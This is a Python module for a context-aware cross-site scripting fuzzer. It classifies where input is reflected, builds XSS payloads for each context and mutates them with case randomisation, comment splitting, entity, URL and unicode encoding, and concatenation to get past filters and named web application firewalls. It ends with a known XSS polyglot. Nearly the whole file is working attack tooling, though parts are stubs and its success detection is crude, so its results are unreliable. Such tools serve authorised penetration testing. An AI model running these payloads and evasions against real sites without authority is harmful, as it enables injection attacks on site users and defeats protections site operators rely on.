"""
Module 3: Context-Aware XSS Fuzzing Engine

This module provides intelligent fuzzing capabilities that adapt payloads
based on the injection context. It includes:
- Context detection and classification
- Payload mutation and generation for specific contexts
- Encoding/decoding strategies
- WAF fingerprinting and evasion
- Response differential analysis

The fuzzer learns from responses and adapts its strategy to maximize
the chance of finding XSS vulnerabilities.
"""

import re
import html
import urllib.parse
import base64
import json
from typing import List, Dict, Set, Optional, Tuple, Callable
from dataclasses import dataclass
from enum import Enum
import string
import random
import itertools
import logging

logger = logging.getLogger(__name__)


class InjectionContext(Enum):
    """Detailed injection contexts for XSS"""
    HTML_TAG_CONTENT = "html_tag_content"              # <div>HERE</div>
    HTML_ATTRIBUTE_VALUE = "html_attribute_value"      # <div id="HERE">
    HTML_ATTRIBUTE_NAME = "html_attribute_name"        # <div HERE="value">
    HTML_TAG_NAME = "html_tag_name"                   # <HERE>content</HERE>
    HTML_COMMENT = "html_comment"                      # <!-- HERE -->
    JAVASCRIPT_STRING_SINGLE = "js_string_single"      # var x = 'HERE';
    JAVASCRIPT_STRING_DOUBLE = "js_string_double"      # var x = "HERE";
    JAVASCRIPT_TEMPLATE = "js_template"                # var x = `HERE`;
    JAVASCRIPT_VARIABLE = "js_variable"                # var HERE = value;
    JAVASCRIPT_COMMENT_LINE = "js_comment_line"        # // HERE
    JAVASCRIPT_COMMENT_BLOCK = "js_comment_block"      # /* HERE */
    CSS_PROPERTY_VALUE = "css_property_value"          # color: HERE;
    CSS_SELECTOR = "css_selector"                      # HERE { color: red; }
    CSS_COMMENT = "css_comment"                        # /* HERE */
    URL_PATH = "url_path"                              # /path/HERE
    URL_QUERY = "url_query"                            # ?param=HERE
    URL_FRAGMENT = "url_fragment"                      # #HERE
    JSON_VALUE = "json_value"                          # {"key": "HERE"}
    XML_CONTENT = "xml_content"                        # <node>HERE</node>
    XML_ATTRIBUTE = "xml_attribute"                    # <node attr="HERE">


@dataclass
class FuzzingResult:
    """Result of a fuzzing attempt"""
    payload: str
    context: InjectionContext
    success: bool
    confidence: float
    mutations_applied: List[str]
    encoding_used: str
    response_indicators: Dict[str, any]
    waf_detected: bool
    waf_type: Optional[str]


@dataclass
class ContextFingerprint:
    """Fingerprint of an injection context"""
    context_type: InjectionContext
    prefix: str
    suffix: str
    filters_detected: List[str]
    allowed_chars: Set[str]
    blocked_chars: Set[str]
    max_length: Optional[int]
    encoding_required: Optional[str]


class ContextAwareFuzzer:
    """
    Advanced context-aware XSS fuzzing engine.
    
    This fuzzer intelligently adapts payloads based on the detected
    injection context and learns from responses to improve effectiveness.
    
    Features:
    - Automatic context detection
    - Context-specific payload generation
    - Adaptive mutation strategies
    - WAF detection and evasion
    - Character set analysis
    
    Example:
        fuzzer = ContextAwareFuzzer()
        context = fuzzer.detect_context(response, injection_point)
        payloads = fuzzer.generate_payloads(context)
        results = fuzzer.fuzz_parameter(url, param, payloads)
    """
    
    def __init__(self):
        # Context detection patterns
        self.context_patterns = {
            InjectionContext.HTML_TAG_CONTENT: [
                (r'<[^>]+>([^<]*?){INJECTION}([^<]*?)</[^>]+>', 'HTML tag content'),
                (r'>([^<]*?){INJECTION}([^<]*?)<', 'Between tags'),
            ],
            InjectionContext.HTML_ATTRIBUTE_VALUE: [
                (r'<[^>]+\s+\w+=["\']([^"\']*?){INJECTION}([^"\']*?)["\'][^>]*>', 'Quoted attribute'),
                (r'<[^>]+\s+\w+=([^\s>]*?){INJECTION}([^\s>]*?)[\s>]', 'Unquoted attribute'),
            ],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: [
                (r"'([^']*?){INJECTION}([^']*?)'", 'Single-quoted JS string'),
            ],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: [
                (r'"([^"]*?){INJECTION}([^"]*?)"', 'Double-quoted JS string'),
            ],
            InjectionContext.JAVASCRIPT_TEMPLATE: [
                (r'`([^`]*?){INJECTION}([^`]*?)`', 'Template literal'),
            ],
            InjectionContext.CSS_PROPERTY_VALUE: [
                (r':\s*([^;}\s]*?){INJECTION}([^;}\s]*?)[;\}]', 'CSS property value'),
            ],
            InjectionContext.URL_QUERY: [
                (r'[?&]\w+=([^&]*?){INJECTION}([^&]*?)(?:&|$)', 'URL query parameter'),
            ],
            InjectionContext.JSON_VALUE: [
                (r':\s*"([^"]*?){INJECTION}([^"]*?)"', 'JSON string value'),
            ],
        }
        
        # Context-specific breaking sequences
        self.context_breakers = {
            InjectionContext.HTML_TAG_CONTENT: ['<', '>', '</', '/>'],
            InjectionContext.HTML_ATTRIBUTE_VALUE: ['"', "'", ' ', '>'],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: ["'", '\\', '\n'],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: ['"', '\\', '\n'],
            InjectionContext.JAVASCRIPT_TEMPLATE: ['`', '${', '}'],
            InjectionContext.CSS_PROPERTY_VALUE: [';', '}', '/*', '*/'],
            InjectionContext.URL_QUERY: ['&', '#', ' ', '%00'],
            InjectionContext.JSON_VALUE: ['"', '\\', '\n', '}'],
        }
        
        # Encoding functions
        self.encoders = {
            'none': lambda x: x,
            'html': html.escape,
            'url': urllib.parse.quote,
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'html_decimal': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'html_hex': lambda x: ''.join(f'&#x{ord(c):02x};' for c in x),
        }
        
        # WAF signatures
        self.waf_signatures = {
            'ModSecurity': ['ModSecurity', 'Mod_Security', 'NOYB'],
            'AWS WAF': ['AWS WAF', 'AWSalb'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'Akamai': ['akamai', 'akamai-ghost'],
            'F5 BIG-IP': ['F5-', 'BIG-IP', 'x-waf-status'],
            'Barracuda': ['barracuda', 'barra'],
            'Sucuri': ['sucuri', 'x-sucuri-id'],
            'Wordfence': ['wordfence', 'wf-'],
        }
        
        # Character sets for fuzzing
        self.special_chars = set('<>"\'/\\()[]{}=:`;&%')
        self.whitespace_chars = set(' \t\n\r\f\v')
        self.control_chars = set(chr(i) for i in range(32))
        
        # Mutation strategies
        self.mutations = [
            self._mutate_case,
            self._mutate_encoding,
            self._mutate_whitespace,
            self._mutate_comments,
            self._mutate_unicode,
            self._mutate_double_encode,
            self._mutate_concatenation,
        ]
        
        # Learning data
        self.context_knowledge = {}
        self.successful_payloads = {}
        self.blocked_patterns = set()
    
    def detect_context(self, response: str, injection_marker: str = "CANARY") -> ContextFingerprint:
        """
        Detect the injection context by analyzing where the marker appears.
        
        Args:
            response: HTTP response containing the injection marker
            injection_marker: The marker that was injected
            
        Returns:
            ContextFingerprint with detected context information
        """
        logger.info(f"Detecting context for marker: {injection_marker}")
        
        # Find all occurrences of the marker
        marker_positions = self._find_marker_positions(response, injection_marker)
        
        if not marker_positions:
            logger.warning("Marker not found in response")
            return ContextFingerprint(
                context_type=InjectionContext.HTML_TAG_CONTENT,
                prefix="",
                suffix="",
                filters_detected=[],
                allowed_chars=set(),
                blocked_chars=set(),
                max_length=None,
                encoding_required=None
            )
        
        # Analyze each occurrence
        contexts = []
        for pos in marker_positions:
            ctx = self._analyze_context_at_position(response, pos, injection_marker)
            if ctx:
                contexts.append(ctx)
        
        # Return the most likely context
        if contexts:
            return self._select_best_context(contexts)
        
        # Default context
        return ContextFingerprint(
            context_type=InjectionContext.HTML_TAG_CONTENT,
            prefix="",
            suffix="",
            filters_detected=[],
            allowed_chars=set(string.printable),
            blocked_chars=set(),
            max_length=None,
            encoding_required=None
        )
    
    def generate_payloads(self, context: ContextFingerprint, 
                         base_payloads: Optional[List[str]] = None) -> List[str]:
        """
        Generate context-aware payloads.
        
        Args:
            context: The detected injection context
            base_payloads: Optional base payloads to adapt
            
        Returns:
            List of context-adapted payloads
        """
        if base_payloads is None:
            base_payloads = self._get_default_payloads(context.context_type)
        
        adapted_payloads = []
        
        for base_payload in base_payloads:
            # Generate context-specific variants
            variants = self._generate_context_variants(base_payload, context)
            adapted_payloads.extend(variants)
            
            # Apply mutations
            for variant in variants[:5]:  # Limit mutations to prevent explosion
                mutated = self._apply_mutations(variant, context)
                adapted_payloads.extend(mutated)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in adapted_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        logger.info(f"Generated {len(unique_payloads)} payloads for {context.context_type}")
        return unique_payloads
    
    def fuzz_context(self, test_function: Callable[[str], str], 
                    context: ContextFingerprint,
                    max_attempts: int = 100) -> List[FuzzingResult]:
        """
        Fuzz a specific context with adaptive payloads.
        
        Args:
            test_function: Function that takes payload and returns response
            context: The injection context to fuzz
            max_attempts: Maximum fuzzing attempts
            
        Returns:
            List of fuzzing results
        """
        results = []
        payloads = self.generate_payloads(context)
        
        for i, payload in enumerate(payloads[:max_attempts]):
            try:
                # Test the payload
                response = test_function(payload)
                
                # Analyze the result
                result = self._analyze_fuzzing_result(payload, response, context)
                results.append(result)
                
                # Learn from the result
                self._learn_from_result(result, context)
                
                # Adapt strategy based on results
                if i % 10 == 0:  # Every 10 attempts
                    self._adapt_fuzzing_strategy(results, context)
                
            except Exception as e:
                logger.error(f"Error fuzzing with payload {payload}: {e}")
                continue
        
        return results
    
    def _find_marker_positions(self, response: str, marker: str) -> List[int]:
        """Find all positions where the marker appears"""
        positions = []
        start = 0
        
        while True:
            pos = response.find(marker, start)
            if pos == -1:
                break
            positions.append(pos)
            start = pos + 1
        
        return positions
    
    def _analyze_context_at_position(self, response: str, position: int, 
                                   marker: str) -> Optional[ContextFingerprint]:
        """Analyze the context at a specific position"""
        # Extract surrounding context
        window_size = 100
        start = max(0, position - window_size)
        end = min(len(response), position + len(marker) + window_size)
        context_window = response[start:end]
        
        # Try to match against known patterns
        for context_type, patterns in self.context_patterns.items():
            for pattern, description in patterns:
                # Replace {INJECTION} with the actual marker
                pattern_with_marker = pattern.replace('{INJECTION}', re.escape(marker))
                match = re.search(pattern_with_marker, context_window)
                
                if match:
                    prefix = match.group(1) if match.lastindex >= 1 else ""
                    suffix = match.group(2) if match.lastindex >= 2 else ""
                    
                    return ContextFingerprint(
                        context_type=context_type,
                        prefix=prefix,
                        suffix=suffix,
                        filters_detected=self._detect_filters(response, marker),
                        allowed_chars=self._detect_allowed_chars(response),
                        blocked_chars=set(),
                        max_length=self._detect_max_length(response),
                        encoding_required=self._detect_encoding(response, marker)
                    )
        
        return None
    
    def _select_best_context(self, contexts: List[ContextFingerprint]) -> ContextFingerprint:
        """Select the most likely context from multiple detections"""
        # For now, return the first one
        # In a more sophisticated implementation, we would score each context
        return contexts[0]
    
    def _get_default_payloads(self, context_type: InjectionContext) -> List[str]:
        """Get default payloads for a specific context"""
        context_payloads = {
            InjectionContext.HTML_TAG_CONTENT: [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
            ],
            InjectionContext.HTML_ATTRIBUTE_VALUE: [
                '" onmouseover=alert(1) "',
                "' onclick=alert(1) '",
                '" autofocus onfocus=alert(1) "',
                '"><script>alert(1)</script>',
            ],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: [
                "';alert(1);//",
                "\\';alert(1);//",
                "'+alert(1)+'",
                "'-alert(1)-'",
            ],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: [
                '";alert(1);//',
                '\\";alert(1);//',
                '"+alert(1)+"',
                '"-alert(1)-"',
            ],
            InjectionContext.CSS_PROPERTY_VALUE: [
                'expression(alert(1))',
                'url("javascript:alert(1)")',
                '}body{background:url("javascript:alert(1)")',
            ],
            InjectionContext.URL_QUERY: [
                'javascript:alert(1)',
                '"><script>alert(1)</script>',
                "';alert(1);//",
            ],
        }
        
        return context_payloads.get(context_type, ['<script>alert(1)</script>'])
    
    def _generate_context_variants(self, payload: str, 
                                 context: ContextFingerprint) -> List[str]:
        """Generate context-specific variants of a payload"""
        variants = [payload]
        
        # Add context breakers
        breakers = self.context_breakers.get(context.context_type, [])
        for breaker in breakers:
            # Try to break out of context first
            variants.append(breaker + payload)
            variants.append(payload + breaker)
            variants.append(breaker + payload + breaker)
        
        # Add encoding variants
        if context.encoding_required:
            encoder = self.encoders.get(context.encoding_required)
            if encoder:
                variants.extend([encoder(v) for v in variants[:5]])
        
        # Filter based on allowed/blocked characters
        filtered_variants = []
        for variant in variants:
            if self._is_payload_allowed(variant, context):
                filtered_variants.append(variant)
        
        return filtered_variants
    
    def _apply_mutations(self, payload: str, context: ContextFingerprint) -> List[str]:
        """Apply various mutations to a payload"""
        mutated = []
        
        for mutation_func in self.mutations:
            try:
                mutated_payload = mutation_func(payload, context)
                if mutated_payload and mutated_payload != payload:
                    mutated.append(mutated_payload)
            except Exception as e:
                logger.debug(f"Mutation failed: {e}")
                continue
        
        return mutated
    
    def _mutate_case(self, payload: str, context: ContextFingerprint) -> str:
        """Apply case mutations"""
        # Don't mutate case in case-sensitive contexts
        if context.context_type in [InjectionContext.JAVASCRIPT_STRING_SINGLE,
                                   InjectionContext.JAVASCRIPT_STRING_DOUBLE]:
            return payload
        
        # Random case for tag names and attributes
        if '<' in payload:
            # Find tag names and randomize case
            def randomize_tag_case(match):
                tag = match.group(1)
                return '<' + ''.join(random.choice([c.upper(), c.lower()]) for c in tag)
            
            return re.sub(r'<([a-zA-Z]+)', randomize_tag_case, payload)
        
        return payload
    
    def _mutate_encoding(self, payload: str, context: ContextFingerprint) -> str:
        """Apply encoding mutations"""
        # Try different encodings based on context
        if context.context_type == InjectionContext.URL_QUERY:
            return urllib.parse.quote(payload, safe='')
        elif context.context_type in [InjectionContext.HTML_TAG_CONTENT,
                                     InjectionContext.HTML_ATTRIBUTE_VALUE]:
            # HTML entity encode some characters
            encoded = payload
            for char in ['<', '>', '"', "'", '&']:
                if char in encoded:
                    encoded = encoded.replace(char, f'&#{ord(char)};')
            return encoded
        
        return payload
    
    def _mutate_whitespace(self, payload: str, context: ContextFingerprint) -> str:
        """Apply whitespace mutations"""
        # Add various whitespace characters
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        
        # Insert random whitespace in safe locations
        if context.context_type == InjectionContext.HTML_TAG_CONTENT:
            # Add whitespace around tags
            mutated = payload
            for ws in random.sample(whitespace_chars, 2):
                mutated = re.sub(r'(<)', rf'{ws}\1', mutated)
                mutated = re.sub(r'(>)', rf'\1{ws}', mutated)
            return mutated
        
        return payload
    
    def _mutate_comments(self, payload: str, context: ContextFingerprint) -> str:
        """Apply comment-based mutations"""
        if context.context_type == InjectionContext.HTML_TAG_CONTENT:
            # Try to use HTML comments to break up payload
            if '<script>' in payload:
                return payload.replace('<script>', '<scr<!-- -->ipt>')
        elif context.context_type in [InjectionContext.JAVASCRIPT_STRING_SINGLE,
                                     InjectionContext.JAVASCRIPT_STRING_DOUBLE]:
            # Use JS comments
            return payload + '/*comment*/'
        
        return payload
    
    def _mutate_unicode(self, payload: str, context: ContextFingerprint) -> str:
        """Apply Unicode mutations"""
        # Unicode escaping for JavaScript contexts
        if context.context_type in [InjectionContext.JAVASCRIPT_STRING_SINGLE,
                                   InjectionContext.JAVASCRIPT_STRING_DOUBLE]:
            # Escape some characters as Unicode
            unicode_payload = ""
            for char in payload:
                if random.random() > 0.7:  # 30% chance to encode
                    unicode_payload += f'\\u{ord(char):04x}'
                else:
                    unicode_payload += char
            return unicode_payload
        
        return payload
    
    def _mutate_double_encode(self, payload: str, context: ContextFingerprint) -> str:
        """Apply double encoding mutations"""
        if context.context_type == InjectionContext.URL_QUERY:
            # Double URL encode
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif context.context_type in [InjectionContext.HTML_TAG_CONTENT,
                                     InjectionContext.HTML_ATTRIBUTE_VALUE]:
            # Double HTML encode
            return html.escape(html.escape(payload))
        
        return payload
    
    def _mutate_concatenation(self, payload: str, context: ContextFingerprint) -> str:
        """Apply string concatenation mutations"""
        if 'alert' in payload:
            # JavaScript contexts - use concatenation
            if context.context_type in [InjectionContext.JAVASCRIPT_STRING_SINGLE,
                                       InjectionContext.JAVASCRIPT_STRING_DOUBLE]:
                return payload.replace('alert', 'al'+'+'+'ert')
            # HTML contexts - use HTML entities
            elif context.context_type == InjectionContext.HTML_TAG_CONTENT:
                return payload.replace('alert', 'al&#101;rt')
        
        return payload
    
    def _is_payload_allowed(self, payload: str, context: ContextFingerprint) -> bool:
        """Check if payload contains only allowed characters"""
        if context.blocked_chars:
            return not any(char in payload for char in context.blocked_chars)
        
        if context.allowed_chars:
            return all(char in context.allowed_chars for char in payload)
        
        return True
    
    def _detect_filters(self, response: str, marker: str) -> List[str]:
        """Detect active filters based on response"""
        filters = []
        
        # Check for common filter indicators
        if marker.lower() in response and marker not in response:
            filters.append('lowercase_filter')
        
        if html.escape(marker) in response and marker not in response:
            filters.append('html_encoding')
        
        if urllib.parse.quote(marker) in response and marker not in response:
            filters.append('url_encoding')
        
        # Check for stripped tags
        if '<' not in response and '<' in marker:
            filters.append('tag_stripping')
        
        return filters
    
    def _detect_allowed_chars(self, response: str) -> Set[str]:
        """Detect which characters are allowed based on response"""
        # For now, return all printable characters
        # In a real implementation, we would test character sets
        return set(string.printable)
    
    def _detect_max_length(self, response: str) -> Optional[int]:
        """Detect maximum allowed input length"""
        # This would require multiple tests with different lengths
        return None
    
    def _detect_encoding(self, response: str, marker: str) -> Optional[str]:
        """Detect if encoding is required"""
        if html.escape(marker) in response and marker not in response:
            return 'html'
        elif urllib.parse.quote(marker) in response and marker not in response:
            return 'url'
        
        return None
    
    def _analyze_fuzzing_result(self, payload: str, response: str, 
                               context: ContextFingerprint) -> FuzzingResult:
        """Analyze the result of a fuzzing attempt"""
        # Check for successful injection indicators
        success_indicators = [
            'alert', 'confirm', 'prompt',  # JavaScript execution
            'onerror', 'onload', 'onclick',  # Event handlers
            '<script', '<img', '<svg',  # Tag injection
        ]
        
        success = any(indicator in response.lower() for indicator in success_indicators)
        
        # Calculate confidence
        confidence = 0.0
        if payload in response:
            confidence += 0.5
        if any(indicator in response.lower() for indicator in success_indicators):
            confidence += 0.3
        if not self._detect_waf_block(response):
            confidence += 0.2
        
        # Detect WAF
        waf_detected, waf_type = self._detect_waf(response)
        
        return FuzzingResult(
            payload=payload,
            context=context.context_type,
            success=success,
            confidence=min(1.0, confidence),
            mutations_applied=[],  # Track mutations in real implementation
            encoding_used='none',
            response_indicators={
                'payload_reflected': payload in response,
                'length': len(response),
                'status_code': 200,  # Would get from actual response
            },
            waf_detected=waf_detected,
            waf_type=waf_type
        )
    
    def _detect_waf(self, response: str) -> Tuple[bool, Optional[str]]:
        """Detect if a WAF is present"""
        response_lower = response.lower()
        
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if signature.lower() in response_lower:
                    return True, waf_name
        
        # Check for generic WAF indicators
        waf_indicators = [
            'blocked', 'forbidden', 'not acceptable',
            'security policy', 'access denied', 'suspicious'
        ]
        
        if any(indicator in response_lower for indicator in waf_indicators):
            return True, 'Generic'
        
        return False, None
    
    def _detect_waf_block(self, response: str) -> bool:
        """Detect if the request was blocked by WAF"""
        blocked_indicators = [
            'blocked', 'forbidden', '403', '406',
            'security', 'firewall', 'denied'
        ]
        
        return any(indicator in response.lower() for indicator in blocked_indicators)
    
    def _learn_from_result(self, result: FuzzingResult, context: ContextFingerprint):
        """Learn from fuzzing results to improve future attempts"""
        # Store successful payloads
        if result.success:
            context_key = context.context_type.value
            if context_key not in self.successful_payloads:
                self.successful_payloads[context_key] = []
            self.successful_payloads[context_key].append(result.payload)
        
        # Learn blocked patterns
        if result.waf_detected:
            self.blocked_patterns.add(result.payload)
    
    def _adapt_fuzzing_strategy(self, results: List[FuzzingResult], 
                               context: ContextFingerprint):
        """Adapt fuzzing strategy based on results"""
        # Calculate success rate
        if not results:
            return
        
        success_rate = sum(1 for r in results if r.success) / len(results)
        
        # If low success rate, try different approach
        if success_rate < 0.1:
            logger.info("Low success rate, adapting strategy...")
            # Would implement strategy adaptation here
    
    def generate_polyglot(self, contexts: List[InjectionContext]) -> str:
        """Generate a polyglot payload for multiple contexts"""
        # This is a simplified polyglot generator
        # A real implementation would be much more sophisticated
        
        polyglot = 'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//'
        
        return polyglot